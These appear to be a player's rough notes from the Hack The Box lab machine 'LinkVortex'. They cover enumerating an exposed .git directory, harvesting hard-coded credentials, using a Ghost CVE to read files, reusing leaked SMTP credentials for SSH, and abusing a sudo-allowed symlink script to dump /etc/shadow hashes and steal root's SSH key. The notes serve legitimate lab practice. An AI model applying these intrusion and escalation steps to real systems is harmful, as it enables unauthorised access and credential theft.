___



http://linkvortex.htb/server-status

page available but don't have permissions to see it

CMS (content management system) is GHOST 

linkvortex.htb/ghost is login page

i can see on the site that admin is a user

GHOST 5.58 is being used
I have CVE for it # CVE-2023-40028
but need admin password?

need to enumerate dev subdomain
have not found anything there> getting word list diffed?

nmap taking 50 bilion years for some reason idk why


this is the only subdomain
http://dev.linkvortex.htb/


found dev.linkvortex.htb/.git  directory

# creds

in there on one of the commits you have hard coded credentials 
        it('complete setup', async function () {
            const email = 'test@example.com';
            const password = 'OctopiFociPilfer45';


# more creds 

name: 'test user',
email: 'test-leo@example.com',
password: 'thisissupersafe',
blogTitle: 'a test blog'


# more

name: 'test user edit',
email: 'test-edit@example.com',
password: 'thisissupersafe',
blogTitle: 'a test blog'


 # more

const email = 'test@example.com';
const password = 'thisissupersafe';



I have creds and passwords and i have the exploit, what I don't have is a username
what is the username?

admin?
linkvortex?
link?
vortex?

# found user

admin@linkvortex.htb
password: OctopiFociPilfer45

# dumped /etc/passwd

file> /etc/passwd  
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
node:x:1000:1000::/home/node:/bin/bash


# ghost 5.58 is the version

running a docker container with it to identify what important files i need to read


# got this from /var/lib/ghost/config.development.json

  },
  "mail": {
     "transport": "SMTP",
     "options": {
      "service": "Google",
      "host": "linkvortex.htb",
      "port": 587,
      "auth": {
        "user": "bob@linkvortex.htb",
        "pass": "fibber-talented-worth"
        }
      }
    }

# can log into ssh with this password/user !!!!!
# user flag


# can run this as root

User bob may run the following commands on linkvortex:
    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png

# /etc/shadow

bob@linkvortex:/opt/ghost$ sudo /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/test.png 
Link found [ /home/bob/test.png ] , moving it to quarantine
Content:
root:$y$j9T$C3zg87gHwrCXO0vl4igIh/$iisf9sVwilKAi7mI5p1FqQslJWM9t2.YUWznIPC/XIA:19814:0:99999:7:::
daemon:*:19579:0:99999:7:::
bin:*:19579:0:99999:7:::
sys:*:19579:0:99999:7:::
sync:*:19579:0:99999:7:::
games:*:19579:0:99999:7:::
man:*:19579:0:99999:7:::
lp:*:19579:0:99999:7:::
mail:*:19579:0:99999:7:::
news:*:19579:0:99999:7:::
uucp:*:19579:0:99999:7:::
proxy:*:19579:0:99999:7:::
www-data:*:19579:0:99999:7:::
backup:*:19579:0:99999:7:::
list:*:19579:0:99999:7:::
irc:*:19579:0:99999:7:::
gnats:*:19579:0:99999:7:::
nobody:*:19579:0:99999:7:::
_apt:*:19579:0:99999:7:::
systemd-network:*:19579:0:99999:7:::
systemd-resolve:*:19579:0:99999:7:::
messagebus:*:19579:0:99999:7:::
systemd-timesync:*:19579:0:99999:7:::
pollinate:*:19579:0:99999:7:::
sshd:*:19579:0:99999:7:::
usbmux:*:19814:0:99999:7:::
bob:$6$rounds=656000$4p3mw8hAd9ir.25f$ocGm9nW1TM2AB8Z.l0K.hi43bOrm3oxQsaKFACMoS2UL.tIXxSW3u/xsClrvkEhP5s.GUpdIvCX3qRtppDV8r.:19814:0:99999:7:::
dnsmasq:*:19814:0:99999:7:::
_laurel:!:20057::::::


# was able to read files with script creating a double sym link 

# did it from bob directory theres a weird sticky bit in tmp thta stops it from working????



# after this read /root/.ssh/id_rsa thats the private ssh key

logged into root with ssh -i private_key root@linkvortex.htb

thats it pwn




